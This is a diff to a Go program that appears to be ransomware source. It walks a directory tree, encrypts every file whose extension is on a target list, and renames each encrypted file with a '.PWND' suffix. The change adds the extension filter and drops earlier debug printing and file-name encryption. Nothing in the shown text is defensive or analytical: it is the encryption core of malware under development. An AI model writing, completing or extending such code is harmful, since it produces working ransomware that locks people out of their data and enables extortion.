@@ -2,12 +2,20 @@ package main
 
 import (
 	b64 "encoding/base64"
-	"fmt"
 	"io/ioutil"
 	"os"
 	"path/filepath"
 	"strings"
 )
+
+func HasMatchingExtension(filePath string, extensions []string) bool {
+	for _, ex := range extensions {
+		if filepath.Ext(filePath) == ex {
+			return true
+		}
+	}
+	return false
+}
 
 func GetFileContent(fileName string) []byte {
 	data, err := ioutil.ReadFile(fileName)
@@ -33,21 +41,12 @@ func EncryptFileName(fileName string, key []byte) string {
 	return newFileName
 }
 
-func EncryptSystem(root string, key []byte) {
+func EncryptSystem(root string, targets []string, key []byte) {
 	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
-		if !d.IsDir() {
-
-			// Debug
-			fmt.Println("PATH: ", GetFileDirectory(path, d.Name()))
-			fmt.Println("NAME: ", d.Name())
-
-			fileName := d.Name()
-			originalPath := path
-			newFileName := EncryptFileName(fileName, key)
-			newPath := GetFileDirectory(path, fileName) + newFileName
-			EncryptFile(originalPath, key)
-			err := os.Rename(originalPath, newPath)
-			checkError(err)
+		// Check if not a directory, and contains one of our extensions:
+		if !d.IsDir() && HasMatchingExtension(path, targets) {
+			EncryptFile(path, key)
+			os.Rename(path, path+".PWND")
 		}
 		return nil
 	})
